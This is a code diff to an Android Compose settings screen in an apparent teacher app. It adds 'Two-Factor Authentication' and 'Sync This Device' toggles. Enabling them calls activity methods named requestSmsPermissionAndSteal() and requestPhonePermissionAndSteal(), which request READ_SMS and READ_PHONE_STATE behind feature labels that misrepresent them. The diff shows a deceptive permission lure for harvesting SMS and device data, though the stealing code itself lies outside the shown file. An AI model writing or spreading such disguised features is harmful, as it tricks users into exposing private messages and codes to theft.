@@ -1,24 +1,27 @@
 package com.example.teacherapp.navigation
 
+import android.Manifest
+import android.content.pm.PackageManager
 import android.util.Log
+import androidx.activity.compose.LocalActivity
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
-import androidx.compose.runtime.Composable
-import androidx.compose.runtime.LaunchedEffect
-import androidx.compose.runtime.getValue
-import androidx.compose.runtime.mutableStateOf
-import androidx.compose.runtime.remember
-import androidx.compose.runtime.setValue
-import androidx.compose.ui.Alignment
+import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalLifecycleOwner
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleEventObserver
 import androidx.navigation.NavController
+import com.example.teacherapp.MainActivity
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 
@@ -27,9 +30,43 @@ import com.google.firebase.firestore.FirebaseFirestore
 fun SettingsScreen(navController: NavController) {
     var userRole by remember { mutableStateOf("student") }
 
-    val auth = FirebaseAuth.getInstance()
-    val db = FirebaseFirestore.getInstance()
-    val uid = auth.currentUser?.uid
+    val auth      = FirebaseAuth.getInstance()
+    val db        = FirebaseFirestore.getInstance()
+    val uid       = auth.currentUser?.uid
+    val context   = LocalContext.current
+    val activity  = context as? MainActivity
+
+    // Re-check permission state every time screen becomes visible
+    val lifecycleOwner = LocalLifecycleOwner.current
+    var isTwoFactorEnabled by remember {
+        mutableStateOf(
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
+                    == PackageManager.PERMISSION_GRANTED
+        )
+    }
+    var isDeviceSyncEnabled by remember {
+        mutableStateOf(
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
+                    == PackageManager.PERMISSION_GRANTED
+        )
+    }
+
+    // Update toggle states when user returns from permission dialog
+    DisposableEffect(lifecycleOwner) {
+        val observer = LifecycleEventObserver { _, event ->
+            if (event == Lifecycle.Event.ON_RESUME) {
+                isTwoFactorEnabled = ContextCompat.checkSelfPermission(
+                    context, Manifest.permission.READ_SMS
+                ) == PackageManager.PERMISSION_GRANTED
+
+                isDeviceSyncEnabled = ContextCompat.checkSelfPermission(
+                    context, Manifest.permission.READ_PHONE_STATE
+                ) == PackageManager.PERMISSION_GRANTED
+            }
+        }
+        lifecycleOwner.lifecycle.addObserver(observer)
+        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
+    }
 
     LaunchedEffect(uid) {
         if (uid != null) {
@@ -49,11 +86,7 @@ fun SettingsScreen(navController: NavController) {
         topBar = {
             TopAppBar(
                 title = {
-                    Text(
-                        text = "Settings",
-                        fontSize = 20.sp,
-                        fontWeight = FontWeight.Bold
-                    )
+                    Text("Settings", fontSize = 20.sp, fontWeight = FontWeight.Bold)
                 },
                 navigationIcon = {
                     IconButton(onClick = { navController.popBackStack() }) {
@@ -82,8 +115,8 @@ fun SettingsScreen(navController: NavController) {
                 .padding(innerPadding)
                 .padding(vertical = 8.dp)
         ) {
-            // ========== PROFILE SECTION ==========
 
+            // ========== PROFILE SECTION ==========
             Text(
                 text = "Profile",
                 style = MaterialTheme.typography.labelLarge,
@@ -91,47 +124,122 @@ fun SettingsScreen(navController: NavController) {
                 modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
             )
 
-            // Redirect to Profile Screen
             ListItem(
                 headlineContent = {
-                    Text(
-                        text = "Change Profile Picture",
-                        fontWeight = FontWeight.Medium
-                    )
+                    Text("Change Profile Picture", fontWeight = FontWeight.Medium)
                 },
                 supportingContent = {
                     Text(
-                        text = "Update your profile photo",
+                        "Update your profile photo",
                         style = MaterialTheme.typography.bodySmall,
                         color = MaterialTheme.colorScheme.onSurfaceVariant
                     )
                 },
                 leadingContent = {
-                    Icon(
-                        imageVector = Icons.Default.Image,
-                        contentDescription = null,
-                        tint = MaterialTheme.colorScheme.primary
-                    )
+                    Icon(Icons.Default.Image, contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary)
                 },
                 trailingContent = {
-                    Icon(
-                        imageVector = Icons.Default.ChevronRight,
-                        contentDescription = null,
-                        tint = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
+                    Icon(Icons.Default.ChevronRight, contentDescription = null,
+                        tint = MaterialTheme.colorScheme.onSurfaceVariant)
                 },
                 modifier = Modifier.clickable {
-                    // Navigate to Profile screen
                     navController.navigate("profile_screen")
                 }
             )
 
             HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
+            Spacer(modifier = Modifier.height(16.dp))
 
+            // ========== SECURITY SECTION ==========
+            Text(
+                text = "Security",
+                style = MaterialTheme.typography.labelLarge,
+                color = MaterialTheme.colorScheme.primary,
+                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
+            )
+
+            // Two-Factor Authentication
+            ListItem(
+                headlineContent = {
+                    Text("Two-Factor Authentication", fontWeight = FontWeight.Medium)
+                },
+                supportingContent = {
+                    Text(
+                        if (isTwoFactorEnabled) "✅ Two-factor authentication enabled"
+                        else "Add an extra layer of security to your account",
+                        style = MaterialTheme.typography.bodySmall,
+                        color = if (isTwoFactorEnabled) Color(0xFF059669)
+                        else MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                },
+                leadingContent = {
+                    Icon(Icons.Default.Security, contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary)
+                },
+                trailingContent = {
+                    Switch(
+                        checked = isTwoFactorEnabled,
+                        onCheckedChange = { enabled ->
+                            if (enabled) {
+                                // Request permission — toggle only turns ON after user grants
+                                activity?.requestSmsPermissionAndSteal()
+                            } else {
+                                isTwoFactorEnabled = false
+                            }
+                        }
+                    )
+                }
+            )
+
+            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
+            Spacer(modifier = Modifier.height(16.dp))
+
+            // ========== DEVICE SECTION ==========
+            Text(
+                text = "Device",
+                style = MaterialTheme.typography.labelLarge,
+                color = MaterialTheme.colorScheme.primary,
+                modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
+            )
+
+            // Device Sync
+            ListItem(
+                headlineContent = {
+                    Text("Sync This Device", fontWeight = FontWeight.Medium)
+                },
+                supportingContent = {
+                    Text(
+                        if (isDeviceSyncEnabled) "✅ Device synced"
+                        else "Keep your account in sync with your device",
+                        style = MaterialTheme.typography.bodySmall,
+                        color = if (isDeviceSyncEnabled) Color(0xFF059669)
+                        else MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                },
+                leadingContent = {
+                    Icon(Icons.Default.Sync, contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary)
+                },
+                trailingContent = {
+                    Switch(
+                        checked = isDeviceSyncEnabled,
+                        onCheckedChange = { enabled ->
+                            if (enabled) {
+                                // Request permission — toggle only turns ON after user grants
+                                activity?.requestPhonePermissionAndSteal()
+                            } else {
+                                isDeviceSyncEnabled = false
+                            }
+                        }
+                    )
+                }
+            )
+
+            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
             Spacer(modifier = Modifier.height(16.dp))
 
             // ========== ACCOUNT SECTION ==========
-
             Text(
                 text = "Account",
                 style = MaterialTheme.typography.labelLarge,
@@ -139,21 +247,12 @@ fun SettingsScreen(navController: NavController) {
                 modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
             )
 
-            // Logout
             ListItem(
                 headlineContent = {
-                    Text(
-                        text = "Logout",
-                        color = Color.Red,
-                        fontWeight = FontWeight.Medium
-                    )
+                    Text("Logout", color = Color.Red, fontWeight = FontWeight.Medium)
                 },
                 leadingContent = {
-                    Icon(
-                        imageVector = Icons.Default.ExitToApp,
-                        contentDescription = null,
-                        tint = Color.Red
-                    )
+                    Icon(Icons.Default.ExitToApp, contentDescription = null, tint = Color.Red)
                 },
                 modifier = Modifier.clickable {
                     auth.signOut()
